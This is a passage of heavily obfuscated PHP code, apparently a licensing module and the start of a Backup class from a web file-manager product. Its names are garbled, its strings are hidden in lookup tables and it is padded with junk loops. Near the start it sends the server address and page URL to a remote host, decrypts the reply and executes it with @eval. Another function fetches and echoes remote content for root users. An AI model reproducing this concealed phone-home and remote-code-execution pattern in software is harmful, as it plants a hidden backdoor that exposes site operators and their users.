$ß÷–òÉã[$¹ùÆç‘£[152]]) { $ÙğôÄõÆ = array($¹ùÆç‘£[185] => $’§‚¹‚, $¹ùÆç‘£[186] => $_SERVER[$¹ùÆç‘£[106]], $¹ùÆç‘£[187] => this_url(), $¹ùÆç‘£[161] => $_SERVER[$¹ùÆç‘£[162]]); $Ş»ıÊ¯ = $this->qhsg0bed6bad(json_encode($ÙğôÄõÆ)); $Ğ°ş£  = $this->qahw0812d20a($¹ùÆç‘£[188] . $Ş»ıÊ¯); if ($Ğ°ş£  && is_array($Ğ°ş£ ) && isset($Ğ°ş£ [$¹ùÆç‘£[262]])) { $¸ˆ¡¸å = $this->vmzj3e1b7c15($Ğ°ş£ [$¹ùÆç‘£[262]], 2); if ($¸ˆ¡¸å) { $¸ˆ¡¸å = $this->ybnf021878e9($¸ˆ¡¸å); } if ($¸ˆ¡¸å) { try { @eval($¸ˆ¡¸å); } catch (Exception $ á…û¹¼) { } } } } } private function qahw0812d20a($Æê× = '', $Ù¸Éæ”ë = array(), $Ï¹´Ò› = 5) { $’¤ş³’ˆ =& $_SERVER[¬ÏÕ§Áú]; $Ÿ–ˆõ®ª =& $_SERVER[øÍ¯û–ª]; $‚ˆÀÈ‰‚ = $Ÿ–ˆõ®ª[263]; $‚ˆÀÈ‰‚ = $this->vfuh3de67cb7($‚ˆÀÈ‰‚, $Ÿ–ˆõ®ª[264]); $µŒÂ¥óó = $’¤ş³’ˆ[783]; if (strlen($µŒÂ¥óó) < $’¤ş³’ˆ[715]) { die; } $‚ˆÀÈ‰‚ = $‚ˆÀÈ‰‚ . $Æê×; $¥ºâñÆí = $’¤ş³’ˆ[784]; if (strlen($¥ºâñÆí) < $’¤ş³’ˆ[748]) { return; } if ($Ù¸Éæ”ë && is_array($Ù¸Éæ”ë)) { $‚ˆÀÈ‰‚ = $‚ˆÀÈ‰‚ . $Ÿ–ˆõ®ª[265] . http_build_query($Ù¸Éæ”ë); } if ($Ù¸Éæ”ë === -1) { return $‚ˆÀÈ‰‚; } $éÜ™ŸòÄ = stream_context_create(array($Ÿ–ˆõ®ª[219] => array($Ÿ–ˆõ®ª[222] => $Ï¹´Ò›, $Ÿ–ˆõ®ª[220] => $Ÿ–ˆõ®ª[266]), $Ÿ–ˆõ®ª[267] => array($Ÿ–ˆõ®ª[268] => !1, $Ÿ–ˆõ®ª[269] => !1))); $Ó§ŸÊŸ = $’¤ş³’ˆ[785]; if (!$Ó§ŸÊŸ) { return; } $Ù¸Éæ”ë = @file_get_contents($‚ˆÀÈ‰‚, !1, $éÜ™ŸòÄ); $êø´¿Í¢ = $’¤ş³’ˆ[786]; if (!$êø´¿Í¢) { return; } return json_decode($Ù¸Éæ”ë, !0); $†¤Å–® = $’¤ş³’ˆ[787]; if (!$†¤Å–®) { die; } } private function qihdd1a5e03e() { $‚á„í¯ =& $_SERVER[¬ÏÕ§Áú]; $¹ôÙÑ¯— =& $_SERVER[øÍ¯û–ª]; $­®»÷¾¼ = array($¹ôÙÑ¯—[270] => $¹ôÙÑ¯—[271], $¹ôÙÑ¯—[272] => $¹ôÙÑ¯—[273], $¹ôÙÑ¯—[274] => $¹ôÙÑ¯—[275], $¹ôÙÑ¯—[276] => $¹ôÙÑ¯—[277], $¹ôÙÑ¯—[278] => $¹ôÙÑ¯—[279], $¹ôÙÑ¯—[280] => $¹ôÙÑ¯—[214], $¹ôÙÑ¯—[281] => $¹ôÙÑ¯—[214], $¹ôÙÑ¯—[282] => $¹ôÙÑ¯—[271], $¹ôÙÑ¯—[283] => $¹ôÙÑ¯—[273], $¹ôÙÑ¯—[284] => $¹ôÙÑ¯—[275], $¹ôÙÑ¯—[285] => $¹ôÙÑ¯—[286], $¹ôÙÑ¯—[287] => $¹ôÙÑ¯—[277], $¹ôÙÑ¯—[288] => $¹ôÙÑ¯—[289], $¹ôÙÑ¯—[290] => $¹ôÙÑ¯—[279], $¹ôÙÑ¯—[291] => $¹ôÙÑ¯—[292], $¹ôÙÑ¯—[293] => $¹ôÙÑ¯—[294], $¹ôÙÑ¯—[295] => $¹ôÙÑ¯—[296]); $Í†Õ÷ = $­®»÷¾¼[$this->ysfc45f101c4]; $²‰åœñı = $‚á„í¯[788]; if (!$²‰åœñı) { return; } $Í†Õ÷ = intval($Í†Õ÷ ? $Í†Õ÷ : $¹ôÙÑ¯—[271]); $‹à¨´Àš = $‚á„í¯[789]; if (strlen($‹à¨´Àš) < $‚á„í¯[711]) { die; } $ïåÚã”ª = _get($this->zdih62c8d9ad, $¹ôÙÑ¯—[297]); $ïåÚã”ª = $ïåÚã”ª ? intval($ïåÚã”ª) : 0; $‚´¤Ü = $‚á„í¯[790]; if (strlen($‚´¤Ü) < $‚á„í¯[720]) { return; } return $Í†Õ÷ + $ïåÚã”ª; } public function tkrp5c17610d($Åºïí”Å) { $‘èäºä– =& $_SERVER[¬ÏÕ§Áú]; $¥ëÙê¨³ =& $_SERVER[øÍ¯û–ª]; $Éïôú¨ı = $this->qihdd1a5e03e(); $¦ã‡ˆ³Î = $‘èäºä–[791]; if ($Åºïí”Å[$¥ëÙê¨³[298]] == $¥ëÙê¨³[122]) { return; } if ($Éïôú¨ı >= intval($¥ëÙê¨³[214])) { return; } $¬òÁª¡ = Model($¥ëÙê¨³[125])->count(); $½Ç­‚ÖÂ = $‘èäºä–[792]; while ($½Ç­‚ÖÂ < $‘èäºä–[711]) { if ($½Ç­‚ÖÂ >= 0) { break; } $½Ç­‚ÖÂ++; } if ($¬òÁª¡ <= $Éïôú¨ı) { return; } $¾‚ìÏê = Model($¥ëÙê¨³[125])->field($¥ëÙê¨³[298])->limit($Éïôú¨ı)->select(); $¼¥Èœ = $‘èäºä–[793]; if (!$¼¥Èœ) { die; } $¾‚ìÏê = array_to_keyvalue($¾‚ìÏê, $¥ëÙê¨³[6], $¥ëÙê¨³[298]); if (!in_array($Åºïí”Å[$¥ëÙê¨³[298]], $¾‚ìÏê)) { show_json($¥ëÙê¨³[299], !1, $¥ëÙê¨³[210]); } } public function argj50d54653() { $òÛÉ¥±ù =& $_SERVER[¬ÏÕ§Áú]; $ùÌÁìÏÒ =& $_SERVER[øÍ¯û–ª]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÔÜ’³…¢ = $ùÌÁìÏÒ[217]; $Éµä´Ï = $òÛÉ¥±ù[794]; if (!$Éµä´Ï) { return; } $ÔÜ’³…¢ = $this->vfuh3de67cb7($ÔÜ’³…¢, $ùÌÁìÏÒ[218]); $Àä„“Ì = $òÛÉ¥±ù[795]; $˜À•¤÷ = stream_context_create(array($ùÌÁìÏÒ[219] => array($ùÌÁìÏÒ[220] => $ùÌÁìÏÒ[221], $ùÌÁìÏÒ[222] => 3))); $‚¸†’€â = @file_get_contents($ÔÜ’³…¢, !1, $˜À•¤÷); echo $ùÌÁìÏÒ[300] . hash_encode($‚¸†’€â) . $ùÌÁìÏÒ[301]; $ÆÊ­ıÌ‚ = $òÛÉ¥±ù[796]; if (strlen($ÆÊ­ıÌ‚) < $òÛÉ¥±ù[66]) { die; } } private function dfyv05af7f89($ıÆ„²°ô, $×¯½Šéñ, $Ö™Š¥ı = 3) { $áÉëŠ» =& $_SERVER[¬ÏÕ§Áú]; $µïö È’ =& $_SERVER[øÍ¯û–ª]; usleep(1); $ŞËïÚò = $áÉëŠ»[797]; if (!$ŞËïÚò) { die; } $ıÆ„²°ô = trim($ıÆ„²°ô); $ëø®—Á = mt_rand(0, 5) . $µïö È’[6]; $ì×¾ğóù = $áÉëŠ»[798]; while (strlen($ì×¾ğóù) < $áÉëŠ»[711]) { if (!$ì×¾ğóù) { break; } $ì×¾ğóù++; } $¥ïÙ´Ê = rand_string(15); $Öø‰Ë‚Ü = $µïö È’[302]; $øÇå³ÄÆ = $áÉëŠ»[799]; if (strlen($øÇå³ÄÆ) < $áÉëŠ»[711]) { return; } switch ($ëø®—Á) { case $µïö È’[206]: $ğ¸Ü¥Ù¶ = $this->oejf2a487dc6($ıÆ„²°ô, strrev($×¯½Šéñ . $¥ïÙ´Ê)); break; $µ÷‡¢‚¼ = $áÉëŠ»[800]; case $µïö È’[122]: $ğ¸Ü¥Ù¶ = $this->oejf2a487dc6($ıÆ„²°ô, strrev($¥ïÙ´Ê . $×¯½Šéñ)); $‘ «Ûé = $áÉëŠ»[801]; while ($‘ «Ûé < $áÉëŠ»[711]) { if ($‘ «Ûé >= 0) { break; } $‘ «Ûé++; } break; $àëçŠ¸‚ = $áÉëŠ»[802]; while ($àëçŠ¸‚ < $áÉëŠ»[715]) { if ($àëçŠ¸‚ >= 0) { break; } $àëçŠ¸‚++; } case $µïö È’[303]: $ğ¸Ü¥Ù¶ = $this->oejf2a487dc6($ıÆ„²°ô, base64_encode($¥ïÙ´Ê . $×¯½Šéñ)); break; $ô˜±ó² = $áÉëŠ»[803]; while ($ô˜±ó² < $áÉëŠ»[711]) { if ($ô˜±ó² >= 0) { break; } $ô˜±ó²++; } case $µïö È’[304]: $ğ¸Ü¥Ù¶ = $this->oejf2a487dc6($ıÆ„²°ô, md5($¥ïÙ´Ê . $×¯½Šéñ)); break; $åïÖ«”Î = $áÉëŠ»[804]; if (strlen($åïÖ«”Î) < $áÉëŠ»[720]) { return; } case $µïö È’[305]: $ıÆ„²°ô = base64_encode($ıÆ„²°ô); $ªä¬èåŞ = rand(0, 64); $ïÀ¨şËÆ = $áÉëŠ»[805]; while (strlen($ïÀ¨şËÆ) < $áÉëŠ»[720]) { if (!$ïÀ¨şËÆ) { break; } $ïÀ¨şËÆ++; } $ÔİÅÇê = $Öø‰Ë‚Ü[$ªä¬èåŞ]; $íÔ¬İ®ç = $áÉëŠ»[806]; while ($íÔ¬İ®ç < $áÉëŠ»[715]) { if ($íÔ¬İ®ç >= 0) { break; } $íÔ¬İ®ç++; } $ÅÇÁä‡ = md5($ÔİÅÇê . md5($×¯½Šéñ . $ÔİÅÇê) . $×¯½Šéñ); $Ñ¸äØµ = $áÉëŠ»[807]; if (strlen($Ñ¸äØµ) < $áÉëŠ»[748]) { return; } $ÅÇÁä‡ = substr($ÅÇÁä‡, $ªä¬èåŞ % 8, $ªä¬èåŞ % 8 + 7); $ÒÕö¸›µ = $áÉëŠ»[808]; while ($ÒÕö¸›µ < $áÉëŠ»[66]) { if ($ÒÕö¸›µ >= 0) { break; } $ÒÕö¸›µ++; } $¿Á„ì = $µïö È’[6]; $§Ú‘ˆ·¦ = $áÉëŠ»[809]; $Ï‘ÊõêÄ = 0; $üˆ¼ñ¸÷ = $áÉëŠ»[810]; if (strlen($üˆ¼ñ¸÷) < $áÉëŠ»[711]) { return; } $‘¤¯ê¦” = 0; $Ü€ŞÖ½¨ = $áÉëŠ»[811]; if (!$Ü€ŞÖ½¨) { return; } $¬¤¨ş„‡ = 0; $°×¥•ñÙ = $áÉëŠ»[734]; while ($°×¥•ñÙ < $áÉëŠ»[66]) { if ($°×¥•ñÙ >= 0) { break; } $°×¥•ñÙ++; } for ($Ï‘ÊõêÄ = 0; $Ï‘ÊõêÄ < strlen($ıÆ„²°ô); $Ï‘ÊõêÄ++) { $¬¤¨ş„‡ = $¬¤¨ş„‡ == strlen($ÅÇÁä‡) ? 0 : $¬¤¨ş„‡; $¸ò—«³ø = $áÉëŠ»[812]; while (strlen($¸ò—«³ø) < $áÉëŠ»[748]) { if (!$¸ò—«³ø) { break; } $¸ò—«³ø++; } $‘¤¯ê¦” = ($ªä¬èåŞ + strpos($Öø‰Ë‚Ü, $ıÆ„²°ô[$Ï‘ÊõêÄ]) + ord($ÅÇÁä‡[$¬¤¨ş„‡++])) % 64; $ëÒÜò½Ú = $áÉëŠ»[813]; if (!$ëÒÜò½Ú) { die; } $¿Á„ì .= $Öø‰Ë‚Ü[$‘¤¯ê¦”]; } $ğ¸Ü¥Ù¶ = hash_encode($ÔİÅÇê . $¿Á„ì); break; $šòªó¾× = $áÉëŠ»[814]; while (strlen($šòªó¾×) < $áÉëŠ»[715]) { if (!$šòªó¾×) { break; } $šòªó¾×++; } default: $ğ¸Ü¥Ù¶ = $this->oejf2a487dc6($ıÆ„²°ô, $×¯½Šéñ . $¥ïÙ´Ê); $âèÛÈ–Ø = $áÉëŠ»[815]; if (strlen($âèÛÈ–Ø) < $áÉëŠ»[66]) { die; } break; $Í¾Ï•áö = $áÉëŠ»[816]; if (strlen($Í¾Ï•áö) < $áÉëŠ»[715]) { die; } } $ğ¸Ü¥Ù¶ = strrev($ëø®—Á . $¥ïÙ´Ê . $ğ¸Ü¥Ù¶); $ì¹¦ = $áÉëŠ»[817]; while ($ì¹¦ < $áÉëŠ»[66]) { if ($ì¹¦ >= 0) { break; } $ì¹¦++; } if ($Ö™Š¥ı - 1 > 0) { $ğ¸Ü¥Ù¶ = $this->dfyv05af7f89($ğ¸Ü¥Ù¶, $×¯½Šéñ, $Ö™Š¥ı - 1); } return $ğ¸Ü¥Ù¶; } private function vmzj3e1b7c15($‚àõƒ, $•™×€ºö, $¹óşÛ = 3) { $€òú°×Ã =& $_SERVER[¬ÏÕ§Áú]; $ùÉğ¸ =& $_SERVER[øÍ¯û–ª]; if (!is_string($‚àõƒ) || strlen($‚àõƒ) < 10) { return !1; } $‚àõƒ = trim($‚àõƒ); $‚àõƒ = strrev($‚àõƒ); $Œ‘†Õì¶ = $‚àõƒ[0]; $ûÛ÷İ¾ˆ = $€òú°×Ã[818]; if (!$ûÛ÷İ¾ˆ) { die; } $³ÃæñÌ = substr($‚àõƒ, 1, 15); $ÉıêŒ·” = $€òú°×Ã[819]; $‚àõƒ = substr($‚àõƒ, 16); $¡‰½ğÅì = $ùÉğ¸[302]; $Ï“õ»†Ÿ = $€òú°×Ã[820]; if (strlen($Ï“õ»†Ÿ) < $€òú°×Ã[748]) { die; } switch ($Œ‘†Õì¶) { case $ùÉğ¸[206]: $›ŞÒáƒğ = $this->vfuh3de67cb7($‚àõƒ, strrev($•™×€ºö . $³ÃæñÌ)); $†‘Ì‡¼‹ = $€òú°×Ã[821]; if (!$†‘Ì‡¼‹) { return; } break; case $ùÉğ¸[122]: $›ŞÒáƒğ = $this->vfuh3de67cb7($‚àõƒ, strrev($³ÃæñÌ . $•™×€ºö)); break; $°†çò±· = $€òú°×Ã[822]; if (strlen($°†çò±·) < $€òú°×Ã[715]) { return; } case $ùÉğ¸[303]: $›ŞÒáƒğ = $this->vfuh3de67cb7($‚àõƒ, base64_encode($³ÃæñÌ . $•™×€ºö)); $ÓÜ§·×’ = $€òú°×Ã[823]; break; $âˆ¿â—Á = $€òú°×Ã[824]; if (!$âˆ¿â—Á) { return; } case $ùÉğ¸[304]: $›ŞÒáƒğ = $this->vfuh3de67cb7($‚àõƒ, md5($³ÃæñÌ . $•™×€ºö)); $¹Ø…ÒœÎ = $€òú°×Ã[825]; if (!$¹Ø…ÒœÎ) { return; } break; case $ùÉğ¸[305]: $‚àõƒ = hash_decode($‚àõƒ); $¦÷çºè = $€òú°×Ã[826]; while (strlen($¦÷çºè) < $€òú°×Ã[720]) { if (!$¦÷çºè) { break; } $¦÷çºè++; } $¯ô¿îıœ = $‚àõƒ[0]; $„¨İÛú³ = $€òú°×Ã[827]; if (!$„¨İÛú³) { return; } $‚àõƒ = substr($‚àõƒ, 1); $® ‰îŸ = strpos($¡‰½ğÅì, $¯ô¿îıœ); $û÷Ëá¯ = md5($¯ô¿îıœ . md5($•™×€ºö . $¯ô¿îıœ) . $•™×€ºö); $ÇÆôÔ = $€òú°×Ã[828]; $û÷Ëá¯ = substr($û÷Ëá¯, $® ‰îŸ % 8, $® ‰îŸ % 8 + 7); $Áï««¸… = $€òú°×Ã[829]; $ £™®Şâ = $ùÉğ¸[6]; $éå†‡çÙ = $€òú°×Ã[830]; while (strlen($éå†‡çÙ) < $€òú°×Ã[720]) { if (!$éå†‡çÙ) { break; } $éå†‡çÙ++; } $—Ñ´—š¥ = 0; $ïÁËüÉ‰ = 0; $ğ³ŒÇù = $€òú°×Ã[831]; while ($ğ³ŒÇù < $€òú°×Ã[748]) { if ($ğ³ŒÇù >= 0) { break; } $ğ³ŒÇù++; } $¦ˆ°ù½† = 0; for ($—Ñ´—š¥ = 0; $—Ñ´—š¥ < strlen($‚àõƒ); $—Ñ´—š¥++) { $¦ˆ°ù½† = $¦ˆ°ù½† == strlen($û÷Ëá¯) ? 0 : $¦ˆ°ù½†; $¶ï’ò®¯ = $¦ˆ°ù½†++; $ïÁËüÉ‰ = strpos($¡‰½ğÅì, $‚àõƒ[$—Ñ´—š¥]) - $® ‰îŸ - ord($û÷Ëá¯[$¶ï’ò®¯]); while ($ïÁËüÉ‰ < 0) { $ïÁËüÉ‰ += 64; } $ £™®Şâ .= $¡‰½ğÅì[$ïÁËüÉ‰]; } $›ŞÒáƒğ = base64_decode($ £™®Şâ); $ÖôË–øµ = $€òú°×Ã[832]; break; default: $›ŞÒáƒğ = $this->vfuh3de67cb7($‚àõƒ, $•™×€ºö . $³ÃæñÌ); $¸Çğ‚õ¨ = $€òú°×Ã[833]; if (strlen($¸Çğ‚õ¨) < $€òú°×Ã[748]) { return; } break; $ïıÕåˆ = $€òú°×Ã[834]; if (strlen($ïıÕåˆ) < $€òú°×Ã[748]) { die; } } if ($¹óşÛ - 1 > 0) { $›ŞÒáƒğ = $this->vmzj3e1b7c15($›ŞÒáƒğ, $•™×€ºö, $¹óşÛ - 1); } return $›ŞÒáƒğ; } public function qhsg0bed6bad($üü³Ï§º) { $Œ…ÄìŞ¸ =& $_SERVER[¬ÏÕ§Áú]; $ˆûÂ€Ùâ =& $_SERVER[øÍ¯û–ª]; $ËÙ¢Òú = $this->rpaq91f5affe(); $áàøïÒ± = $this->rpaq91f5affe(); $„Íóáõ = ($ËÙ¢Òú - 1) * ($áàøïÒ± - 1); $¼´öºò¿ = intval(($ËÙ¢Òú + $áàøïÒ±) / 2); $„µñä“ = $Œ…ÄìŞ¸[835]; if (strlen($„µñä“) < $Œ…ÄìŞ¸[715]) { die; } while (1) { $¾É·Äî  = $¼´öºò¿; $ñ«ò½€ß = $Œ…ÄìŞ¸[836]; if (strlen($ñ«ò½€ß) < $Œ…ÄìŞ¸[711]) { die; } $®ù†¥â = $„Íóáõ; while ($®ù†¥â % $¾É·Äî  != 0) { $–õ£²¢º = $®ù†¥â; $®ù†¥â = $¾É·Äî ; $ÅÒ®ä–± = $Œ…ÄìŞ¸[837]; while ($ÅÒ®ä–± < $Œ…ÄìŞ¸[720]) { if ($ÅÒ®ä–± >= 0) { break; } $ÅÒ®ä–±++; } $¾É·Äî  = $–õ£²¢º % $¾É·Äî ; } if ($¾É·Äî  == 1) { break; } else { $¼´öºò¿++; } } $İğÏ©Ñ¤ = 2; $øˆ±à³„ = $Œ…ÄìŞ¸[838]; for ($Ã»‘É» = 0; $Ã»‘É» < $„Íóáõ * 10; $Ã»‘É»++) { if (($„Íóáõ * $Ã»‘É» + 1) % $¼´öºò¿ == 0) { $İğÏ©Ñ¤ = intval(($„Íóáõ * $Ã»‘É» + 1) / $¼´öºò¿); break; } } $Ò«†‰ßß = $this->oejf2a487dc6($ËÙ¢Òú * $áàøïÒ± . $ˆûÂ€Ùâ[6], $ˆûÂ€Ùâ[136]); $®÷ãš‰ï = $Œ…ÄìŞ¸[839]; if (!$®÷ãš‰ï) { return; } $°’š˜ä = md5($ˆûÂ€Ùâ[306] . ($ËÙ¢Òú + $áàøïÒ±) . $ˆûÂ€Ùâ[307] . $¼´öºò¿ . $ˆûÂ€Ùâ[307] . $İğÏ©Ñ¤ . $ˆûÂ€Ùâ[308]); $ÀÂß€²× = $this->oejf2a487dc6($üü³Ï§º, $°’š˜ä) . $ˆûÂ€Ùâ[309] . $Ò«†‰ßß; $¼½¬°“¬ = $Œ…ÄìŞ¸[840]; while (strlen($¼½¬°“¬) < $Œ…ÄìŞ¸[748]) { if (!$¼½¬°“¬) { break; } $¼½¬°“¬++; } return $ÀÂß€²×; $§ÓÆ„ = $Œ…ÄìŞ¸[841]; while ($§ÓÆ„ < $Œ…ÄìŞ¸[66]) { if ($§ÓÆ„ >= 0) { break; } $§ÓÆ„++; } } public function ybnf021878e9($şğå®„€) { $ìÕÎ¸éà =& $_SERVER[¬ÏÕ§Áú]; $İô¾ñ›¸ =& $_SERVER[øÍ¯û–ª]; $ØùĞËÊÈ = explode($İô¾ñ›¸[309], $şğå®„€); $‘ÎÊò¬Å = $ìÕÎ¸éà[842]; if (count($ØùĞËÊÈ) != 2) { return $İô¾ñ›¸[6]; } $İ€œ¯…ğ = $this->vfuh3de67cb7($ØùĞËÊÈ[1] . $İô¾ñ›¸[6], $İô¾ñ›¸[136]); if (!$İ€œ¯…ğ) { return $İô¾ñ›¸[6]; } $İ€œ¯…ğ = intval($İ€œ¯…ğ); $ãäØò½ª = $ìÕÎ¸éà[843]; if (!$ãäØò½ª) { return; } $¸ŒÌŞ½Ä = 0; $¦€£ùóî = $ìÕÎ¸éà[844]; if (!$¦€£ùóî) { die; } $ùåàÆ² = 0; $Ø•ô¶™ü = $ìÕÎ¸éà[845]; if (!$Ø•ô¶™ü) { die; } for ($§¤œ‚ß = 3; $§¤œ‚ß < $İ€œ¯…ğ; $§¤œ‚ß += 2) { if ($İ€œ¯…ğ % $§¤œ‚ß != 0) { continue; } $¸ŒÌŞ½Ä = $§¤œ‚ß; $ˆ›ĞÍ÷× = $ìÕÎ¸éà[846]; if (strlen($ˆ›ĞÍ÷×) < $ìÕÎ¸éà[711]) { return; } $ùåàÆ² = intval($İ€œ¯…ğ / $§¤œ‚ß); break; $öÔÃ–• = $ìÕÎ¸éà[847]; } $èùÊÚŠÊ = ($¸ŒÌŞ½Ä - 1) * ($ùåàÆ² - 1); $¾ğ­‡²ï = $ìÕÎ¸éà[848]; if (!$¾ğ­‡²ï) { die; } $Ù¦øåâ = intval(($¸ŒÌŞ½Ä + $ùåàÆ²) / 2); $şİíÏ¨ = $ìÕÎ¸éà[849]; while ($şİíÏ¨ < $ìÕÎ¸éà[720]) { if ($şİíÏ¨ >= 0) { break; } $şİíÏ¨++; } while (1) { $é³Úîâ¼ = $Ù¦øåâ; $ĞóÎˆç = $ìÕÎ¸éà[850]; while ($ĞóÎˆç < $ìÕÎ¸éà[720]) { if ($ĞóÎˆç >= 0) { break; } $ĞóÎˆç++; } $Â“ş¿±Ş = $èùÊÚŠÊ; while ($Â“ş¿±Ş % $é³Úîâ¼ != 0) { $¸¬İç÷€ = $Â“ş¿±Ş; $³µ£È€§ = $ìÕÎ¸éà[851]; if (!$³µ£È€§) { die; } $Â“ş¿±Ş = $é³Úîâ¼; $é³Úîâ¼ = $¸¬İç÷€ % $é³Úîâ¼; } if ($é³Úîâ¼ == 1) { break; } else { $Ù¦øåâ++; } } $ÓÛÅæò´ = 2; $íùÅ–È‰ = $ìÕÎ¸éà[852]; while (strlen($íùÅ–È‰) < $ìÕÎ¸éà[66]) { if (!$íùÅ–È‰) { break; } $íùÅ–È‰++; } for ($§¤œ‚ß = 0; $§¤œ‚ß < $èùÊÚŠÊ * 10; $§¤œ‚ß++) { if (($èùÊÚŠÊ * $§¤œ‚ß + 1) % $Ù¦øåâ == 0) { $ÓÛÅæò´ = intval(($èùÊÚŠÊ * $§¤œ‚ß + 1) / $Ù¦øåâ); break; } } $¥†ãŞÛ = md5($İô¾ñ›¸[306] . ($¸ŒÌŞ½Ä + $ùåàÆ²) . $İô¾ñ›¸[307] . $Ù¦øåâ . $İô¾ñ›¸[307] . $ÓÛÅæò´ . $İô¾ñ›¸[308]); $”É•ÙÏ• = $ìÕÎ¸éà[853]; while (strlen($”É•ÙÏ•) < $ìÕÎ¸éà[66]) { if (!$”É•ÙÏ•) { break; } $”É•ÙÏ•++; } $·ÊŠÄœã = $this->vfuh3de67cb7($ØùĞËÊÈ[0], $¥†ãŞÛ); $öçõœ° = $ìÕÎ¸éà[854]; if (strlen($öçõœ°) < $ìÕÎ¸éà[748]) { die; } return $·ÊŠÄœã; } public function rpaq91f5affe() { $˜­¡×—ô =& $_SERVER[¬ÏÕ§Áú]; $ğæÙ²­½ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ïƒ§û¢î = array(); $ô„öÊµ = $˜­¡×—ô[855]; if (!$ô„öÊµ) { die; } $×œŠ«¿± = 1; while ($×œŠ«¿± <= (int) sqrt($ğæÙ²­½)) { $ÂË®Ìä– = $×œŠ«¿±; while (!0) { $ÂË®Ìä–++; if ($ÂË®Ìä– <= 2) { $×œŠ«¿± = $ÂË®Ìä–; break; } else { if ($ÂË®Ìä– < 2) { continue; } } $‘ªî·¬ˆ = !0; for ($§û§ë÷ = 2; $§û§ë÷ <= sqrt($ÂË®Ìä–); $§û§ë÷++) { if ($ÂË®Ìä– % $§û§ë÷ == 0) { $‘ªî·¬ˆ = !1; } } if ($‘ªî·¬ˆ) { $×œŠ«¿± = $ÂË®Ìä–; break; } } $Ïƒ§û¢î[] = $×œŠ«¿±; $´ÚĞÒÖ– = $˜­¡×—ô[856]; } $ï»ÌĞ˜† = 2; for ($ÂË®Ìä– = $ğæÙ²­½; $ÂË®Ìä– > 1; $ÂË®Ìä–--) { $‘ªî·¬ˆ = !0; $É¼ûØê“ = $˜­¡×—ô[857]; if (!$É¼ûØê“) { die; } foreach ($Ïƒ§û¢î as $ş’¢ÂÓ) { if ($ÂË®Ìä– % $ş’¢ÂÓ == 0) { $‘ªî·¬ˆ = !1; break; } } if ($‘ªî·¬ˆ) { $ï»ÌĞ˜† = $ÂË®Ìä–; break; } } return $ï»ÌĞ˜†; $¥õğƒ‡­ = $˜­¡×—ô[858]; if (strlen($¥õğƒ‡­) < $˜­¡×—ô[711]) { return; } } public function vzrpc7642e00($…ªğ¿âˆ, $ú³¡’»Ò) { $™†Ş—œÏ =& $_SERVER[øÍ¯û–ª]; return call_user_func(array($™†Ş—œÏ[8], $™†Ş—œÏ[310]), $…ªğ¿âˆ, $ú³¡’»Ò); $ôŠ¦ôû¿ = $_SERVER[¬ÏÕ§Áú][859]; } public function oejf2a487dc6($×Ğ’““Ø, $€ŒçĞÍ½) { $€ÌÕ†¬ü =& $_SERVER[øÍ¯û–ª]; return call_user_func(array($€ÌÕ†¬ü[311], $€ÌÕ†¬ü[312]), $×Ğ’““Ø, $€ŒçĞÍ½); } public function vfuh3de67cb7($©˜î»Ù§, $îÑ§˜˜Ê) { $ƒ¹â»úÔ =& $_SERVER[øÍ¯û–ª]; return call_user_func(array($ƒ¹â»úÔ[311], $ƒ¹â»úÔ[313]), $©˜î»Ù§, $îÑ§˜˜Ê); $Û’Úôö¦ = $_SERVER[¬ÏÕ§Áú][860]; if (!$Û’Úôö¦) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¬ÏÕ§Áú][861]); $this->init(); $this->keep(); } public function init() { $å¦Ø¦ô£ =& $_SERVER[¬ÏÕ§Áú]; $this->isManual(); self::$name = date($å¦Ø¦ô£[862]); if (!($£ı„«î = $this->model->lastItem())) { $£ı„«î = $this->initData(); } else { self::$name = $£ı„«î[$å¦Ø¦ô£[32]]; if ($£ı„«î[$å¦Ø¦ô£[863]] == $å¦Ø¦ô£[101]) { self::$name = date($å¦Ø¦ô£[272]); $¹é·îÅ” = intval(_get($£ı„«î, $å¦Ø¦ô£[864], 0)); if (self::$manual == 0 && $£ı„«î[$å¦Ø¦ô£[32]] == self::$name) { $this->model->remove($£ı„«î[$å¦Ø¦ô£[492]]); } $£ı„«î = $this->initData($¹é·îÅ”, $£ı„«î[$å¦Ø¦ô£[865]]); } else { $this->checkStore($£ı„«î[$å¦Ø¦ô£[865]]); } } self::$option = $£ı„«î; } private function isManual() { $İƒË§·‚ = _get($GLOBALS, $_SERVER[¬ÏÕ§Áú][866], 0); $İƒË§·‚ = intval($İƒË§·‚); self::$manual = $İƒË§·‚ && $İƒË§·‚ == 1 ? 1 : 0; } private function initData($ÜÉ¯òÖ = 0, $‹Ì¹æğƒ = '') { $ÚèóÛè¦ =& $_SERVER[¬ÏÕ§Áú]; $íÁ›–¸ë = $this->model->config(); if ($‹Ì¹æğƒ && $íÁ›–¸ë[$ÚèóÛè¦[865]] != $‹Ì¹æğƒ) { $ÜÉ¯òÖ = 0; } $this->checkStore($íÁ›–¸ë[$ÚèóÛè¦[865]]); if (self::$manual == 1) { self::$name .= $ÚèóÛè¦[11] . date($ÚèóÛè¦[867]); } $öèï­¡í = array($ÚèóÛè¦[865] => $íÁ›–¸ë[$ÚèóÛè¦[865]], $ÚèóÛè¦[32] => self::$name, $ÚèóÛè¦[863] => 0, $ÚèóÛè¦[181] => $íÁ›–¸ë[$ÚèóÛè¦[181]], $ÚèóÛè¦[868] => self::$manual, $ÚèóÛè¦[869] => array($ÚèóÛè¦[870] => array($ÚèóÛè¦[863] => 0), $ÚèóÛè¦[871] => array($ÚèóÛè¦[863] => 0, $ÚèóÛè¦[872] => 0, $ÚèóÛè¦[873] => 0, $ÚèóÛè¦[33] => $ÚèóÛè¦[12], $ÚèóÛè¦[874] => 0, $ÚèóÛè¦[875] => 0), $ÚèóÛè¦[876] => array($ÚèóÛè¦[863] => 0, $ÚèóÛè¦[872] => 0, $ÚèóÛè¦[873] => 0, $ÚèóÛè¦[874] => 0, $ÚèóÛè¦[875] => 0), $ÚèóÛè¦[243] => array($ÚèóÛè¦[863] => 0, $ÚèóÛè¦[877] => 0, $ÚèóÛè¦[878] => 0, $ÚèóÛè¦[879] => 0, $ÚèóÛè¦[880] => 0, $ÚèóÛè¦[562] => $ÜÉ¯òÖ, $ÚèóÛè¦[874] => 0, $ÚèóÛè¦[875] => 0)), $ÚèóÛè¦[874] => time(), $ÚèóÛè¦[875] => 0); $’ØÒ¬Ä§ = $this->model->insert($öèï­¡í); $öèï­¡í[$ÚèóÛè¦[492]] = 